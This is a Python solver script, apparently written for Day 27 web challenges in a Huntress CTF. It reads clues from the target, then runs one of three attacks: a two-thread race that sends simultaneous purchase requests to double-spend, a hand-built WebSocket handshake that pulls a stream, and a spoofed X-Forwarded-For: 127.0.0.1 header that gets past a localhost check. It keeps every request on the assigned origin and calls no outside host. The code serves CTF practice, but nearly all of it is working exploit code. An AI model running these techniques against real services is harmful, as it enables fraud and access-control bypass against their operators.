#!/usr/bin/env python3
"""Solve route-driven Day 27 web targets from their own clues."""

from __future__ import annotations

import argparse
import base64
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import hashlib
from http.cookiejar import CookieJar
import json
import re
import secrets
import socket
import ssl
import threading
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit
from urllib.request import HTTPCookieProcessor, Request, build_opener

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
PROOF_RE = re.compile(rb"\bproof_[A-Za-z0-9_-]{12,}\b")
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))
        self.records: list[dict[str, object]] = []

    def record(self, name: str, body: bytes, **metadata: object) -> None:
        filename = f"{len(self.records) + 1:02d}-{name}.body"
        (self.output_dir / filename).write_bytes(body)
        self.records.append(
            {
                "file": filename,
                "bytes": len(body),
                "sha256": hashlib.sha256(body).hexdigest(),
                **metadata,
            }
        )

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        request_headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        if body is not None:
            request_headers["Content-Type"] = "application/json"
        if headers:
            request_headers.update(headers)
        request = Request(url, data=body, headers=request_headers, method=method)
        try:
            response = self.opener.open(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        data = response.read(MAX_BODY_BYTES + 1)
        if len(data) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")
        self.record(
            urlsplit(url).path.strip("/").replace("/", "_") or "root",
            data,
            url=url,
            method=method,
            status=getattr(response, "status", response.code),
        )
        return int(getattr(response, "status", response.code)), data

    def clues(self) -> dict:
        status, body = self.request("/api/clues")
        if not body:
            raise RuntimeError(f"/api/clues returned HTTP {status} with an empty body")
        value = json.loads(body.decode("utf-8"))
        if isinstance(value, dict) and value.get("error") == "session_required":
            self.request("/")
            status, body = self.request("/api/clues")
            if not body:
                raise RuntimeError(
                    f"/api/clues returned HTTP {status} with an empty body after session setup"
                )
            value = json.loads(body.decode("utf-8"))
        if status != 200 or not isinstance(value, dict):
            raise RuntimeError(f"/api/clues returned an unexpected response: {value}")
        return value

    def save_report(self, proof: str, technique: str, clues: dict) -> None:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "technique": technique,
            "clues": clues,
            "proof": proof,
            "records": self.records,
        }
        (self.output_dir / "report.json").write_text(
            json.dumps(report, indent=2) + "\n", encoding="utf-8"
        )


def solve_double_spent(solver: Solver, clues: dict) -> str:
    feature = clues.get("feature_route")
    audit = clues.get("secondary_route")
    if not isinstance(feature, str) or not isinstance(audit, str):
        raise ValueError("clues do not disclose feature_route and secondary_route")
    feature_url = normalize_url(urljoin(solver.target, feature))
    audit_url = normalize_url(urljoin(solver.target, audit))
    if origin(feature_url) != solver.allowed_origin or origin(audit_url) != solver.allowed_origin:
        raise ValueError("clue route leaves the assigned target")

    barrier = threading.Barrier(2)

    def redeem(_: int) -> tuple[int, bytes, dict[str, str]]:
        url = feature_url
        req = Request(
            url,
            data=b"{}",
            headers={"User-Agent": USER_AGENT, "Accept": "*/*", "Content-Type": "application/json"},
            method="POST",
        )
        barrier.wait(timeout=10)
        try:
            response = solver.opener.open(req, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"concurrent purchase failed: {exc.reason}") from exc
        body = response.read(MAX_BODY_BYTES + 1)
        if len(body) > MAX_BODY_BYTES:
            raise RuntimeError("purchase response exceeded the 2 MiB limit")
        return int(getattr(response, "status", response.code)), body, dict(response.headers)

    with ThreadPoolExecutor(max_workers=2) as pool:
        results = list(pool.map(redeem, range(2)))
    for index, (status, body, headers) in enumerate(results, start=1):
        solver.record(
            f"purchase-{index}",
            body,
            url=feature_url,
            method="POST",
            status=status,
            headers=headers,
        )

    status, body = solver.request(audit, method="GET")
    if status != 200:
        raise RuntimeError(f"audit route returned HTTP {status}: {body.decode('utf-8', 'replace')}")
    result = json.loads(body.decode("utf-8"))
    proof = result.get("evidence") if isinstance(result, dict) else None
    if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof.encode()):
        raise RuntimeError(f"audit response contained no proof: {result}")
    return proof


def read_exact(stream: ssl.SSLSocket, count: int) -> bytes:
    data = bytearray()
    while len(data) < count:
        part = stream.recv(count - len(data))
        if not part:
            raise RuntimeError("WebSocket closed before its proof frame arrived")
        data.extend(part)
    return bytes(data)


def next_ws_payload(stream: ssl.SSLSocket, initial: bytes = b"") -> tuple[int, bytes]:
    buffered = bytearray(initial)

    def take(count: int) -> bytes:
        while len(buffered) < count:
            part = stream.recv(max(4096, count - len(buffered)))
            if not part:
                raise RuntimeError("WebSocket closed before its proof frame arrived")
            buffered.extend(part)
        value = bytes(buffered[:count])
        del buffered[:count]
        return value

    while True:
        first, second = take(2)
        opcode = first & 0x0F
        length = second & 0x7F
        if length == 126:
            length = int.from_bytes(take(2), "big")
        elif length == 127:
            length = int.from_bytes(take(8), "big")
        mask = take(4) if second & 0x80 else b""
        payload = take(length)
        if mask:
            payload = bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))
        if opcode in (0x1, 0x2):
            return opcode, payload
        if opcode == 0x8:
            raise RuntimeError("WebSocket closed without a data frame")


def solve_socket(solver: Solver, clues: dict) -> str:
    route = clues.get("feature_route")
    reference = clues.get("stream_reference")
    if not isinstance(route, str) or reference is None:
        raise ValueError("clues do not disclose feature_route and stream_reference")
    ws_url = normalize_url(urljoin(solver.target, route))
    if origin(ws_url) != solver.allowed_origin or urlsplit(ws_url).scheme != "https":
        raise ValueError("WebSocket route must remain on the assigned HTTPS target")
    parsed = urlsplit(ws_url)
    host = parsed.hostname
    if not host:
        raise ValueError("target URL has no hostname")
    port = parsed.port or 443
    query = parsed.query
    query += ("&" if query else "") + urlencode({"stream": str(reference)})
    path = parsed.path or "/"
    if query:
        path += "?" + query
    key = base64.b64encode(secrets.token_bytes(16)).decode("ascii")
    request = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {parsed.netloc}\r\n"
        "Connection: Upgrade\r\n"
        "Upgrade: websocket\r\n"
        f"Origin: https://{parsed.netloc}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"User-Agent: {USER_AGENT}\r\n"
    )
    cookie_request = Request(ws_url)
    for handler in solver.opener.handlers:
        if isinstance(handler, HTTPCookieProcessor):
            handler.cookiejar.add_cookie_header(cookie_request)
    cookie = cookie_request.get_header("Cookie")
    if cookie:
        request += f"Cookie: {cookie}\r\n"
    request += "\r\n"
    request = request.encode("ascii")
    context = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=15) as raw:
        with context.wrap_socket(raw, server_hostname=host) as stream:
            stream.settimeout(15)
            stream.sendall(request)
            received = bytearray()
            while b"\r\n\r\n" not in received:
                part = stream.recv(4096)
                if not part:
                    raise RuntimeError("target closed during the WebSocket handshake")
                received.extend(part)
                if len(received) > 65536:
                    raise RuntimeError("WebSocket response headers exceeded 64 KiB")
            split_at = received.index(b"\r\n\r\n") + 4
            response_headers = bytes(received[:split_at])
            remainder = bytes(received[split_at:])
            status_line = response_headers.split(b"\r\n", 1)[0]
            if b" 101 " not in status_line:
                solver.record(
                    "websocket-handshake",
                    bytes(received),
                    url=ws_url,
                    status=status_line.decode("ascii", "replace"),
                )
                raise RuntimeError(f"WebSocket upgrade failed: {status_line.decode('ascii', 'replace')}")
            opcode, payload = next_ws_payload(stream, remainder)
            solver.record(
                "websocket-event",
                payload,
                url=ws_url,
                status=101,
                opcode=opcode,
                headers=response_headers.decode("latin-1"),
            )
    match = PROOF_RE.search(payload)
    if not match:
        raise RuntimeError(f"WebSocket event contained no proof: {payload.decode('utf-8', 'replace')}")
    return match.group().decode("ascii")


def solve_forwarded(solver: Solver, clues: dict) -> str:
    route = clues.get("feature_route")
    if not isinstance(route, str):
        raise ValueError("clues do not disclose feature_route")
    status, body = solver.request(
        route,
        method="GET",
        headers={"X-Forwarded-For": "127.0.0.1"},
    )
    if status != 200:
        raise RuntimeError(
            f"forwarded request returned HTTP {status}: {body.decode('utf-8', 'replace')}"
        )
    result = json.loads(body.decode("utf-8"))
    proof = result.get("evidence") if isinstance(result, dict) else None
    if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof.encode()):
        raise RuntimeError(f"forwarded response contained no proof: {result}")
    return proof


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("technique", choices=("double-spent", "socket", "forwarded"))
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    host = urlsplit(normalize_url(args.target)).hostname or "target"
    output_dir = args.output_dir or Path("web-tools/evidence") / f"{host}-day27-{timestamp}"
    try:
        solver = Solver(args.target, output_dir)
        clues = solver.clues()
        if args.technique == "double-spent":
            proof = solve_double_spent(solver, clues)
        elif args.technique == "socket":
            proof = solve_socket(solver, clues)
        else:
            proof = solve_forwarded(solver, clues)
        solver.save_report(proof, args.technique, clues)
    except (OSError, ValueError, RuntimeError, json.JSONDecodeError, ssl.SSLError) as exc:
        print(json.dumps({"error": str(exc)}, indent=2))
        return 1
    print(
        json.dumps(
            {
                "target": solver.target,
                "technique": args.technique,
                "proof": proof,
                "evidence": str(output_dir),
            },
            indent=2,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
